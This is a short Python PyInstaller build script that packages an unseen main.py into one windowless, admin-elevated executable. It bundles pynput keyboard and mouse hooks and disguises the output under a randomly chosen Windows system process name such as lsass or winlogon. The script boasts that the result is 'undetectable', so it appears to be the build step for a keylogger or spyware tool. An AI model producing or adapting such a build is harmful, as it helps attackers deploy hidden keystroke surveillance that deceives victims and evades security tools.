import PyInstaller.__main__
import os
import random

# Use legitimate Windows executable names
system_names = ['dwm', 'winlogon', 'csrss', 'lsass']
random_name = random.choice(system_names)

PyInstaller.__main__.run([
    'main.py',
    '--onefile',
    '--noconsole',
    '--windowed',
    '--hidden-import=pynput.keyboard._win32',
    '--hidden-import=pynput.mouse._win32',
    '--hidden-import=webview',
    '--hidden-import=flask',
    '--hidden-import=google.generativeai',
    f'--name={random_name}',
    '--distpath=.',
    '--clean',
    '--uac-admin',
    '--add-data=.;.',
])

print(f"Undetectable executable: {random_name}.exe")
print("All components integrated into single file")